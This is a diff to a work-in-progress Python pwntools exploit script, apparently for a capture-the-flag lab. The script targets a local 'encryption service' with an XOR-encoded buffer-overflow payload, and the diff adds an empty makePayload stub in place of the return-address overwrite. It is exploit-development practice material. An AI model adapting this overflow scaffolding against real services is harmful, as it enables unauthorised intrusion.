@@ -3,6 +3,13 @@ from pwn import *
 import struct
 import re
 
+
+# Make the payload
+def makePayload(payload):
+
+	# TODO
+
+
 # Sending the data
 def send(data):
 	s.send("E" + struct.pack("I", len(data)) + data)
@@ -13,7 +20,7 @@ def xor(plain, key, keySize):
 
 
 # Initialize the connection
-s = remote("192.168.135.133", 20002)
+s = remote("192.168.159.130", 20002)
 s.recvuntil("[-- Enterprise configuration file encryption service --]")
 
 # Getting the xorkey
@@ -29,10 +36,12 @@ key = s.recv(4096)[1:]
 size = 131088
 payload =  "A"*size
 
-payload += struct.pack("I", 0xdeadbeef)
+payload = makePayload(payload)
+
 
 payload = xor(payload, key, keySize)
 send(payload)
+send("AAAA\x00")
 s.recvuntil("]")
 
 
